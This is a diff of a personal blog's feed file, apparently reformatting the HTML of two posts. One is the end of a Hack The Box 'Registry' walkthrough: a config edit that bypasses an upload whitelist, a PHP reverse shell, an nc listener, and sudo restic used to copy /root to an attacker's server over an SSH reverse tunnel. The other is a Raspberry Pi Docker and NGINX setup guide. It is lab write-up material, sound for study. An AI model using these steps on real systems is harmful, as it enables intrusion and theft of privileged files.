 &lt;p&gt;&lt;img src=&quot;/assets/img/registry/boltloggedin.png&quot; alt=&quot;boltloggedin&quot; /&gt;&lt;/p&gt;
-
 &lt;p&gt;Moving around the site, we find a file upload page. The natural next step is trying to upload a reverse shell, but when we do we see that there is some kind of whitelist in place.&lt;/p&gt;
-
 &lt;p&gt;&lt;img src=&quot;/assets/img/registry/whitelist.png&quot; alt=&quot;whitelist&quot; /&gt;&lt;/p&gt;
-
-&lt;p&gt;Looking through the site’s config, we see that we can modify the &lt;code class=&quot;highlighter-rouge&quot;&gt;accept_file_types&lt;/code&gt; to include php, even though the comment says we cannot.&lt;/p&gt;
-
+&lt;p&gt;Looking through the site's config, we see that we can modify the &lt;code&gt;accept_file_types&lt;/code&gt; to include php, even though the comment says we cannot.&lt;/p&gt;
 &lt;p&gt;&lt;img src=&quot;/assets/img/registry/config.png&quot; alt=&quot;config&quot; /&gt;&lt;/p&gt;
-
-&lt;p&gt;Now that we can upload PHP files, let’s try uploading that reverse shell. The reverse shell I’m using is &lt;a href=&quot;https://github.com/pentestmonkey/php-reverse-shell&quot;&gt;this one&lt;/a&gt; by pentestmonkey. &lt;strong&gt;&lt;em&gt;Note:&lt;/em&gt;&lt;/strong&gt; &lt;em&gt;You need to be really quick in uploading your PHP file after changing the config.yml file, as it is reset back to it’s original contents very quickly. I pulled my hair out for a day over this!&lt;/em&gt;&lt;/p&gt;
-
+&lt;p&gt;Now that we can upload PHP files, let's try uploading that reverse shell. The reverse shell I'm using is &lt;a href=&quot;https://github.com/pentestmonkey/php-reverse-shell&quot;&gt;this one&lt;/a&gt; by pentestmonkey. &lt;em&gt;&lt;strong&gt;Note:&lt;/strong&gt;&lt;/em&gt; &lt;em&gt;You need to be really quick in uploading your PHP file after changing the config.yml file, as it is reset back to it's original contents very quickly. I pulled my hair out for a day over this!&lt;/em&gt;&lt;/p&gt;
 &lt;p&gt;&lt;img src=&quot;/assets/img/registry/uploadsuccess.png&quot; alt=&quot;uploadsuccess&quot; /&gt;&lt;/p&gt;
-
-&lt;p&gt;However, when we execute the file, we don’t get a shell back… To figure out why this might be, let’s just verify we can get a connection back from the box to our kali machine. To do this, I try connecting a simple nc from the my kali machine to the target machine, but unfortunately we got no connection.&lt;/p&gt;
-
+&lt;p&gt;However, when we execute the file, we don't get a shell back... To figure out why this might be, let's just verify we can get a connection back from the box to our kali machine. To do this, I try connecting a simple nc from the my kali machine to the target machine, but unfortunately we got no connection.&lt;/p&gt;
 &lt;p&gt;&lt;img src=&quot;/assets/img/registry/noconnection.png&quot; alt=&quot;noconnection&quot; /&gt;&lt;/p&gt;
-
-&lt;p&gt;So it looks like we can’t get a connection back to our machine. To get around this, we can setup our shell listener within our Bolt SSH session, that way we can send the reverse shell to localhost and hence, the connection never leaves the machine! Following this logic, we get our shell as www-data.&lt;/p&gt;
-
-&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;bolt@bolt:~$ nc -lnvp 12345
+&lt;p&gt;So it looks like we can't get a connection back to our machine. To get around this, we can setup our shell listener within our Bolt SSH session, that way we can send the reverse shell to localhost and hence, the connection never leaves the machine! Following this logic, we get our shell as www-data.&lt;/p&gt;
+&lt;pre&gt;&lt;code&gt;bolt@bolt:~$ nc -lnvp 12345
 Listening on [0.0.0.0] (family 0, port 12345)
 Connection from 127.0.0.1 46400 received!
 Linux bolt 4.15.0-65-generic #74-Ubuntu SMP Tue Sep 17 17:06:04 UTC 2019 x86_64 x86_64 x86_64 GNU/Linux
@@ -364,39 +302,28 @@ uid=33(www-data) gid=33(www-data) groups=33(www-data)
 /bin/sh: 0: can't access tty; job control turned off
 $ whoami
 www-data
-&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
-
+&lt;/code&gt;&lt;/pre&gt;
 &lt;h1 id=&quot;root&quot;&gt;Root&lt;/h1&gt;
-&lt;p&gt;Now we’re on the final stretch, let’s get root.&lt;/p&gt;
-
+&lt;p&gt;Now we're on the final stretch, let's get root.&lt;/p&gt;
 &lt;p&gt;Firstly, lets upgrade our basic PHP shell to an interactive shell.&lt;/p&gt;
-
-&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;$ python3 -c 'import pty;pty.spawn(&quot;/bin/bash&quot;)'
+&lt;pre&gt;&lt;code&gt;$ python3 -c 'import pty;pty.spawn(&amp;quot;/bin/bash&amp;quot;)'
 www-data@bolt:/$ 
-&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
-
+&lt;/code&gt;&lt;/pre&gt;
 &lt;p&gt;Ah, much nicer. Checking our priveleges, we see we can run a command as root without a password.&lt;/p&gt;
-
-&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;www-data@bolt:/$ sudo -l
+&lt;pre&gt;&lt;code&gt;www-data@bolt:/$ sudo -l
 Matching Defaults entries for www-data on bolt:
     env_reset, exempt_group=sudo, mail_badpass,
     secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin
 
 User www-data may run the following commands on bolt:
     (root) NOPASSWD: /usr/bin/restic backup -r rest*
-&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
-
-&lt;p&gt;So it looks like we have to exploit this “restic” program. Doing some research, we see that &lt;a href=&quot;https://restic.net/&quot;&gt;Restic&lt;/a&gt; is a backup program. Reading the &lt;a href=&quot;https://restic.readthedocs.io/en/latest/030_preparing_a_new_repo.html&quot;&gt;documentation&lt;/a&gt; on how to initialize a repo of our own that we can back up to, we see the same &lt;code class=&quot;highlighter-rouge&quot;&gt;restic backup -r rest&lt;/code&gt; command that we can run as root! Reading this section, we see this is to do with setting up a &lt;a href=&quot;https://github.com/restic/rest-server&quot;&gt;Rest Server&lt;/a&gt;.&lt;/p&gt;
-
+&lt;/code&gt;&lt;/pre&gt;
+&lt;p&gt;So it looks like we have to exploit this &amp;quot;restic&amp;quot; program. Doing some research, we see that &lt;a href=&quot;https://restic.net/&quot;&gt;Restic&lt;/a&gt; is a backup program. Reading the &lt;a href=&quot;https://restic.readthedocs.io/en/latest/030_preparing_a_new_repo.html&quot;&gt;documentation&lt;/a&gt; on how to initialize a repo of our own that we can back up to, we see the same &lt;code&gt;restic backup -r rest&lt;/code&gt; command that we can run as root! Reading this section, we see this is to do with setting up a &lt;a href=&quot;https://github.com/restic/rest-server&quot;&gt;Rest Server&lt;/a&gt;.&lt;/p&gt;
 &lt;p&gt;Putting the pieces together, in theory our exploit will look something like this.&lt;/p&gt;
-
-&lt;p&gt;&lt;code class=&quot;highlighter-rouge&quot;&gt;sudo /usr/bin/restic backup -r rest://ourKaliMachine:8000/ /root&lt;/code&gt;&lt;/p&gt;
-
-&lt;p&gt;In words, this will backup the root directory to a rest server that we host and control on our Kali attack machine. Since it runs with root priveleges, it can read and therefore copy the contents of the root directory! So, let’s do it.&lt;/p&gt;
-
+&lt;p&gt;&lt;code&gt;sudo /usr/bin/restic backup -r rest://ourKaliMachine:8000/ /root&lt;/code&gt;&lt;/p&gt;
+&lt;p&gt;In words, this will backup the root directory to a rest server that we host and control on our Kali attack machine. Since it runs with root priveleges, it can read and therefore copy the contents of the root directory! So, let's do it.&lt;/p&gt;
 &lt;p&gt;First, we need to install and initialize the &lt;a href=&quot;https://github.com/restic/rest-server&quot;&gt;Rest Server&lt;/a&gt; and &lt;a href=&quot;https://restic.readthedocs.io/en/latest/030_preparing_a_new_repo.html&quot;&gt;Restic Repository&lt;/a&gt;.&lt;/p&gt;
-
-&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;kali@kali:~$ sudo apt install restic
+&lt;pre&gt;&lt;code&gt;kali@kali:~$ sudo apt install restic
 kali@kali:~$ mkdir -p /tmp/restic
 kali@kali:~$ restic init -r /tmp/restic
 kali@kali:~$ cd /opt
@@ -404,91 +331,61 @@ kali@kali:/opt$ wget -q https://github.com/restic/rest-server/releases/download/
 kali@kali:/opt$ gunzip rest-server-0.9.7-linux-amd64.gz
 kali@kali:/opt$ chmod +x rest-server-0.9.7-linux-amd64
 kali@kali:/opt$ ./rest-server-0.9.7-linux-amd64 --path /tmp/restic --debug
-&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
-
-&lt;p&gt;Now that we have a rest-server up and running on port 8000, we just need to do the backup! But first, we need to find a way to get the backup back to our machine, since we found out before that we can’t get a connection back to our machine. One way to do this, is with &lt;strong&gt;tunnels&lt;/strong&gt;.&lt;/p&gt;
-
-&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;kali@kali:~/htb/registry$ ssh -i bolt-ssh-key -R 8001:127.0.0.1:8000 bolt@10.10.10.159
-&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
-
-&lt;p&gt;This sets up a tunnel to forward all traffic to port 8001 on the remote machine to port 8000 on our Kali machine. So let’s finally root this machine! First, catch a www-data shell in our new Bolt SSH session &lt;strong&gt;with&lt;/strong&gt; port forwarding setup. Next, upgrade our shell again &lt;em&gt;(this is important so that we can enter in the password for our repository)&lt;/em&gt;.&lt;/p&gt;
-
-&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;$ python3 -c 'import pty;pty.spawn(&quot;/bin/bash&quot;)'
-&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
-
+&lt;/code&gt;&lt;/pre&gt;
+&lt;p&gt;Now that we have a rest-server up and running on port 8000, we just need to do the backup! But first, we need to find a way to get the backup back to our machine, since we found out before that we can't get a connection back to our machine. One way to do this, is with &lt;strong&gt;tunnels&lt;/strong&gt;.&lt;/p&gt;
+&lt;pre&gt;&lt;code&gt;kali@kali:~/htb/registry$ ssh -i bolt-ssh-key -R 8001:127.0.0.1:8000 bolt@10.10.10.159
+&lt;/code&gt;&lt;/pre&gt;
+&lt;p&gt;This sets up a tunnel to forward all traffic to port 8001 on the remote machine to port 8000 on our Kali machine. So let's finally root this machine! First, catch a www-data shell in our new Bolt SSH session &lt;strong&gt;with&lt;/strong&gt; port forwarding setup. Next, upgrade our shell again &lt;em&gt;(this is important so that we can enter in the password for our repository)&lt;/em&gt;.&lt;/p&gt;
+&lt;pre&gt;&lt;code&gt;$ python3 -c 'import pty;pty.spawn(&amp;quot;/bin/bash&amp;quot;)'
+&lt;/code&gt;&lt;/pre&gt;
 &lt;p&gt;Backup the repository to port 8001, so that it is forwarded to our Kali machine.&lt;/p&gt;
-
-&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;www-data@bolt:/$ sudo /usr/bin/restic backup -r rest:http://127.0.0.1:8001/ /root
-&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
-
+&lt;pre&gt;&lt;code&gt;www-data@bolt:/$ sudo /usr/bin/restic backup -r rest:http://127.0.0.1:8001/ /root
+&lt;/code&gt;&lt;/pre&gt;
 &lt;p&gt;Finally, restore the backup and get that flag!&lt;/p&gt;
-
-&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;kali@kali:/tmp/restic$ restic restore latest -r /tmp/restic --target ./restore
+&lt;pre&gt;&lt;code&gt;kali@kali:/tmp/restic$ restic restore latest -r /tmp/restic --target ./restore
 kali@kali:/tmp/restic$ cat restore/root/root.txt | wc -c
 33
-&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
-
+&lt;/code&gt;&lt;/pre&gt;
 &lt;p&gt;Donezo.&lt;/p&gt;
 &lt;h1 id=&quot;summary&quot;&gt;Summary&lt;/h1&gt;
 &lt;p&gt;Well, that was a ride! We exploited a bunch of services, including the Docker Registry API, Bolt CMS and Restic. Although the machine was quite complex, I hope my walkthrough was easy enough to follow. This is my first walkthrough, so if you have any feedback please leave it in a comment below!&lt;/p&gt;
-
 &lt;p&gt;If this walkthrough helped you, feel free to /respect me on Hack The Box :)&lt;/p&gt;
-
-&lt;p&gt;&lt;a href=&quot;https://www.hackthebox.eu/home/users/profile/119119&quot;&gt;&lt;script src=&quot;https://www.hackthebox.eu/badge/119119&quot;&gt;&lt;/script&gt;&lt;/a&gt;&lt;/p&gt;</content><author><name></name></author><category term="registry" /><category term="hackthebox" /><category term="docker" /><category term="bolt" /><category term="restic" /><summary type="html">Welcome to my first Hack The Box walkthrough! In this writeup, we’re going to take a look at Registry. This is a “Hard” Linux machine as classified by the team at Hack The Box, and it took me a couple days to crack! Since finishing it, I received lots of requests for nudges/hints regarding the box, and so I figured making a walkthrough would be good for the community, and give me an excuse to do my first write-up. So let’s begin!</summary></entry><entry><title type="html">The Raspberry Pi Project: Part 2 - Web Server</title><link href="https://aidanstansfield.github.io/2020/03/15/raspi-p2.html" rel="alternate" type="text/html" title="The Raspberry Pi Project: Part 2 - Web Server" /><published>2020-03-15T16:25:00+10:00</published><updated>2020-03-15T16:25:00+10:00</updated><id>https://aidanstansfield.github.io/2020/03/15/raspi-p2</id><content type="html" xml:base="https://aidanstansfield.github.io/2020/03/15/raspi-p2.html">&lt;p&gt;So as I mentioned in my &lt;a href=&quot;/2020/03/14/raspi-p1.html&quot;&gt;previous post&lt;/a&gt;, I wanted to use my Raspberry Pi as a webserver so that I could play around with web development projects. More specifically, I wanted to run NGINX, with autogenerated SSL certs from Let’s Encrypt, and I wanted a Dynamic DNS address so that I didn’t have to deal with changing IP addresses provided by my ISP. Oh, and I wanted this to all be described by one simple &lt;code class=&quot;highlighter-rouge&quot;&gt;docker-compose.yml&lt;/code&gt; file.&lt;/p&gt;
-
+&lt;p&gt;&lt;a href=&quot;https://www.hackthebox.eu/home/users/profile/119119&quot;&gt;&lt;script src=&quot;https://www.hackthebox.eu/badge/119119&quot;&gt;&lt;/script&gt;&lt;/a&gt;&lt;/p&gt;</content><author><name></name></author><category term="registry" /><category term="hackthebox" /><category term="docker" /><category term="bolt" /><category term="restic" /><summary type="html">Welcome to my first Hack The Box walkthrough! In this writeup, we're going to take a look at Registry. This is a &amp;quot;Hard&amp;quot; Linux machine as classified by the team at Hack The Box, and it took me a couple days to crack! Since finishing it, I received lots of requests for nudges/hints regarding the box, and so I figured making a walkthrough would be good for the community, and give me an excuse to do my first write-up. So let's begin!</summary></entry><entry><title type="html">The Raspberry Pi Project: Part 2 - Web Server</title><link href="https://aidanstansfield.github.io/2020/03/15/raspi-p2.html" rel="alternate" type="text/html" title="The Raspberry Pi Project: Part 2 - Web Server" /><published>2020-03-15T16:25:00+10:00</published><updated>2020-03-15T16:25:00+10:00</updated><id>https://aidanstansfield.github.io/2020/03/15/raspi-p2</id><content type="html" xml:base="https://aidanstansfield.github.io/2020/03/15/raspi-p2.html">&lt;p&gt;So as I mentioned in my &lt;a href=&quot;/2020/03/14/raspi-p1.html&quot;&gt;previous post&lt;/a&gt;, I wanted to use my Raspberry Pi as a webserver so that I could play around with web development projects. More specifically, I wanted to run NGINX, with autogenerated SSL certs from Let's Encrypt, and I wanted a Dynamic DNS address so that I didn't have to deal with changing IP addresses provided by my ISP. Oh, and I wanted this to all be described by one simple &lt;code&gt;docker-compose.yml&lt;/code&gt; file.&lt;/p&gt;
 &lt;h2 id=&quot;installing-prerequisites&quot;&gt;Installing Prerequisites&lt;/h2&gt;
-&lt;p&gt;First things first, you’ll need to get a Raspberry Pi up and running with Raspbian. There’s plenty of guides on this so if you have know idea, do some googling.&lt;/p&gt;
-
-&lt;p&gt;Next, we need to install Docker &amp;amp; Docker Compose. We’ll start with Docker.&lt;/p&gt;
-
-&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;curl -fsSL get.docker.com -o get-docker.sh &amp;amp;&amp;amp; sh get-docker.sh
-&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
-
-&lt;p&gt;Next, I’d recommend adding yourself to the Docker group so that you don’t have to use &lt;code class=&quot;highlighter-rouge&quot;&gt;sudo&lt;/code&gt; every time you want to run a Docker command.&lt;/p&gt;
-
-&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;sudo usermod -aG docker pi
-&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
-
+&lt;p&gt;First things first, you'll need to get a Raspberry Pi up and running with Raspbian. There's plenty of guides on this so if you have know idea, do some googling.&lt;/p&gt;
+&lt;p&gt;Next, we need to install Docker &amp;amp; Docker Compose. We'll start with Docker.&lt;/p&gt;
+&lt;pre&gt;&lt;code&gt;curl -fsSL get.docker.com -o get-docker.sh &amp;amp;&amp;amp; sh get-docker.sh
+&lt;/code&gt;&lt;/pre&gt;
+&lt;p&gt;Next, I'd recommend adding yourself to the Docker group so that you don't have to use &lt;code&gt;sudo&lt;/code&gt; every time you want to run a Docker command.&lt;/p&gt;
+&lt;pre&gt;&lt;code&gt;sudo usermod -aG docker pi
+&lt;/code&gt;&lt;/pre&gt;
 &lt;p&gt;Next, update your packages.&lt;/p&gt;
-
-&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;sudo apt update &amp;amp;&amp;amp; sudo apt upgrade
-&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
-
+&lt;pre&gt;&lt;code&gt;sudo apt update &amp;amp;&amp;amp; sudo apt upgrade
+&lt;/code&gt;&lt;/pre&gt;
 &lt;p&gt;Now we shall enable the Docker service so that it automatically starts up on boot.&lt;/p&gt;
-
-&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;sudo systemctl enable docker
-&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
-
-&lt;p&gt;Last but not least, let’s install docker-compose&lt;/p&gt;
-
-&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;sudo apt install docker-compose
-&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+&lt;pre&gt;&lt;code&gt;sudo systemctl enable docker
+&lt;/code&gt;&lt;/pre&gt;
+&lt;p&gt;Last but not least, let's install docker-compose&lt;/p&gt;
+&lt;pre&gt;&lt;code&gt;sudo apt install docker-compose
+&lt;/code&gt;&lt;/pre&gt;
 &lt;p&gt;T
-o make sure everything is working properly, let’s run the infamous &lt;code class=&quot;highlighter-rouge&quot;&gt;hello-world&lt;/code&gt; container!&lt;/p&gt;
-
-&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;docker run hello-world
-&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
-
-&lt;p&gt;You should see Docker look for the &lt;code class=&quot;highlighter-rouge&quot;&gt;hello-world&lt;/code&gt; container locally, fail to find it, pull it from the Docker Registry, run it and then display the result in the terminal! If you see this, your Docker installation is working!&lt;/p&gt;
-
-&lt;h2 id=&quot;docker--docker-compose&quot;&gt;Docker &amp;amp; Docker Compose&lt;/h2&gt;
-&lt;p&gt;So what is Docker? Well, I won’t regurgitate what 1000 other blogs have already explained far better than I ever could, so instead, here’s the TLDR:&lt;/p&gt;
+o make sure everything is working properly, let's run the infamous &lt;code&gt;hello-world&lt;/code&gt; container!&lt;/p&gt;
+&lt;pre&gt;&lt;code&gt;docker run hello-world
+&lt;/code&gt;&lt;/pre&gt;
+&lt;p&gt;You should see Docker look for the &lt;code&gt;hello-world&lt;/code&gt; container locally, fail to find it, pull it from the Docker Registry, run it and then display the result in the terminal! If you see this, your Docker installation is working!&lt;/p&gt;
+&lt;h2 id=&quot;docker-amp-docker-compose&quot;&gt;Docker &amp;amp; Docker Compose&lt;/h2&gt;
+&lt;p&gt;So what is Docker? Well, I won't regurgitate what 1000 other blogs have already explained far better than I ever could, so instead, here's the TLDR:&lt;/p&gt;
 &lt;blockquote&gt;
-  &lt;p&gt;Docker lets you package apps and all their dependencies into ‘containers’ that can be downloaded and run on any platform that supports Docker.&lt;/p&gt;
+&lt;p&gt;Docker lets you package apps and all their dependencies into 'containers' that can be downloaded and run on any platform that supports Docker.&lt;/p&gt;
 &lt;/blockquote&gt;
-
 &lt;p&gt;Docker Compose?&lt;/p&gt;
 &lt;blockquote&gt;
-  &lt;p&gt;Docker compose lets you write down how to run a container(s), so that you don’t have to write it all out in the command line every time you wanna boot it up.&lt;/p&gt;
+&lt;p&gt;Docker compose lets you write down how to run a container(s), so that you don't have to write it all out in the command line every time you wanna boot it up.&lt;/p&gt;
 &lt;/blockquote&gt;
-
-&lt;p&gt;It’s more complicated than that, but if you want to find out more, I won’t stop you.&lt;/p&gt;
-
-&lt;p&gt;So rather then explain how Docker Compose files work in general, I figured I’d walk you through my &lt;code class=&quot;highlighter-rouge&quot;&gt;docker-compose.yml&lt;/code&gt; file, because I learn best from examples!&lt;/p&gt;
-
+&lt;p&gt;It's more complicated than that, but if you want to find out more, I won't stop you.&lt;/p&gt;
+&lt;p&gt;So rather then explain how Docker Compose files work in general, I figured I'd walk you through my &lt;code&gt;docker-compose.yml&lt;/code&gt; file, because I learn best from examples!&lt;/p&gt;
 &lt;h2 id=&quot;duckdns&quot;&gt;DuckDNS&lt;/h2&gt;
-&lt;p&gt;So here is a snippet of my compose file that I use to build my web server. This part in particular is used to run my DuckDNS client, so that my dynamic DNS address will always stay up to date. It’s a fairly straight forward example, so let’s take a look.&lt;/p&gt;
-
+&lt;p&gt;So here is a snippet of my compose file that I use to build my web server. This part in particular is used to run my DuckDNS client, so that my dynamic DNS address will always stay up to date. It's a fairly straight forward example, so let's take a look.&lt;/p&gt;
 &lt;div class=&quot;language-yaml highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;na&quot;&gt;version&lt;/span&gt;&lt;span class=&quot;pi&quot;&gt;:&lt;/span&gt; &lt;span class=&quot;s1&quot;&gt;'&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;3'&lt;/span&gt;
 &lt;span class=&quot;na&quot;&gt;services&lt;/span&gt;&lt;span class=&quot;pi&quot;&gt;:&lt;/span&gt;
   &lt;span class=&quot;na&quot;&gt;duckdns&lt;/span&gt;&lt;span class=&quot;pi&quot;&gt;:&lt;/span&gt;
@@ -505,17 +402,11 @@ o make sure everything is working properly, let’s run the infamous &lt;code cl
       &lt;span class=&quot;pi&quot;&gt;-&lt;/span&gt; &lt;span class=&quot;s1&quot;&gt;'&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;./duckdns/config:/config'&lt;/span&gt;
     &lt;span class=&quot;na&quot;&gt;restart&lt;/span&gt;&lt;span class=&quot;pi&quot;&gt;:&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;unless-stopped&lt;/span&gt;
 &lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
-
-&lt;p&gt;To start with, I declare which version of docker-compose I am using. At the time of writing, 3 is the latest, so that is what I am using. Next I declare the services I want to run, which in this case, is just one service I’ve called ‘duckdns’.&lt;/p&gt;
-
-&lt;p&gt;I then tell Docker to use the ‘linuxserver/duckdns:arm32v7-latest’ image, which just describes which container I want to run. More specifically, look for the ‘duckdns’ image by the Docker Hub account ‘linuxserver’, with the tag ‘arm32v7-latest’. Note that it is important to declare the use of the ‘arm32v7-latest’ tag, since the Raspberry Pi 4 runs on arm32v7 architecture. Remember this, because I will bring it up again later.&lt;/p&gt;
-
-&lt;p&gt;Next I give the container the name ‘duckdns’, as well as a bunch of environment variables. To see the explanation behind each of these environment variables, see the &lt;a href=&quot;https://hub.docker.com/r/linuxserver/duckdns/&quot;&gt;linuxserver/duckdns documentation&lt;/a&gt;. It is also worth noting that in the same directory as the &lt;code class=&quot;highlighter-rouge&quot;&gt;docker-compose.yml&lt;/code&gt; file, I have a .env file that contains my &lt;code class=&quot;highlighter-rouge&quot;&gt;DUCKDNS_TOKEN&lt;/code&gt;, which will get substituted in at runtime.&lt;/p&gt;
-
-&lt;p&gt;Next, I tell Docker to mount the &lt;code class=&quot;highlighter-rouge&quot;&gt;/config&lt;/code&gt; folder within the duckdns container to the folder &lt;code class=&quot;highlighter-rouge&quot;&gt;./duckdns/config&lt;/code&gt; on my Pi. This allows me to easily see the duck.log file from the host, as it gets written to &lt;code class=&quot;highlighter-rouge&quot;&gt;/config/duck.log&lt;/code&gt; within the container.&lt;/p&gt;
-
-&lt;p&gt;Finally, I make sure that the container always restarts, unless I’ve manually stopped it. This makes sure that it will automatically start on boot.&lt;/p&gt;
-
+&lt;p&gt;To start with, I declare which version of docker-compose I am using. At the time of writing, 3 is the latest, so that is what I am using. Next I declare the services I want to run, which in this case, is just one service I've called 'duckdns'.&lt;/p&gt;
+&lt;p&gt;I then tell Docker to use the 'linuxserver/duckdns:arm32v7-latest' image, which just describes which container I want to run. More specifically, look for the 'duckdns' image by the Docker Hub account 'linuxserver', with the tag 'arm32v7-latest'. Note that it is important to declare the use of the 'arm32v7-latest' tag, since the Raspberry Pi 4 runs on arm32v7 architecture. Remember this, because I will bring it up again later.&lt;/p&gt;
+&lt;p&gt;Next I give the container the name 'duckdns', as well as a bunch of environment variables. To see the explanation behind each of these environment variables, see the &lt;a href=&quot;https://hub.docker.com/r/linuxserver/duckdns/&quot;&gt;linuxserver/duckdns documentation&lt;/a&gt;. It is also worth noting that in the same directory as the &lt;code&gt;docker-compose.yml&lt;/code&gt; file, I have a .env file that contains my &lt;code&gt;DUCKDNS_TOKEN&lt;/code&gt;, which will get substituted in at runtime.&lt;/p&gt;
+&lt;p&gt;Next, I tell Docker to mount the &lt;code&gt;/config&lt;/code&gt; folder within the duckdns container to the folder &lt;code&gt;./duckdns/config&lt;/code&gt; on my Pi. This allows me to easily see the duck.log file from the host, as it gets written to &lt;code&gt;/config/duck.log&lt;/code&gt; within the container.&lt;/p&gt;
+&lt;p&gt;Finally, I make sure that the container always restarts, unless I've manually stopped it. This makes sure that it will automatically start on boot.&lt;/p&gt;
 &lt;h2 id=&quot;nginx&quot;&gt;NGINX&lt;/h2&gt;
 &lt;p&gt;Next, the container I use to run NGINX.&lt;/p&gt;
 &lt;div class=&quot;language-yaml highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;na&quot;&gt;version&lt;/span&gt;&lt;span class=&quot;pi&quot;&gt;:&lt;/span&gt; &lt;span class=&quot;s1&quot;&gt;'&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;3'&lt;/span&gt;
@@ -546,20 +437,14 @@ o make sure everything is working properly, let’s run the infamous &lt;code cl
   &lt;span class=&quot;na&quot;&gt;dhparam&lt;/span&gt;&lt;span class=&quot;pi&quot;&gt;:&lt;/span&gt;
   &lt;span class=&quot;na&quot;&gt;certs&lt;/span&gt;&lt;span class=&quot;pi&quot;&gt;:&lt;/span&gt;
 &lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
-&lt;p&gt;Now, there’s a couple of differences between this and the DuckDNS example above. The most obvious one, is that it’s a different image (duh). The &lt;a href=&quot;https://github.com/aidanstansfield/nginx-proxy&quot;&gt;image&lt;/a&gt; I’m using is a customized version of &lt;a href=&quot;https://github.com/nginx-proxy/nginx-proxy&quot;&gt;jwilder’s nginx-proxy&lt;/a&gt; that I built myself, with support for the arm32v7 architecture.&lt;/p&gt;
-
+&lt;p&gt;Now, there's a couple of differences between this and the DuckDNS example above. The most obvious one, is that it's a different image (duh). The &lt;a href=&quot;https://github.com/aidanstansfield/nginx-proxy&quot;&gt;image&lt;/a&gt; I'm using is a customized version of &lt;a href=&quot;https://github.com/nginx-proxy/nginx-proxy&quot;&gt;jwilder's nginx-proxy&lt;/a&gt; that I built myself, with support for the arm32v7 architecture.&lt;/p&gt;
 &lt;p&gt;&lt;em&gt;NOTE: I plan on doing a blog post on why and how I built this container in the future, so keep your eyes peeled!&lt;/em&gt;&lt;/p&gt;
-
-&lt;p&gt;If you aren’t familiar with &lt;a href=&quot;https://github.com/nginx-proxy/nginx-proxy&quot;&gt;jwilder’s nginx-proxy&lt;/a&gt;, what it does is observe the Docker containers you run, and if any have the environment variable &lt;code class=&quot;highlighter-rouge&quot;&gt;VIRTUAL_HOST&lt;/code&gt;, it will automagically setup an NGINX proxy and point it to that container!&lt;/p&gt;
-
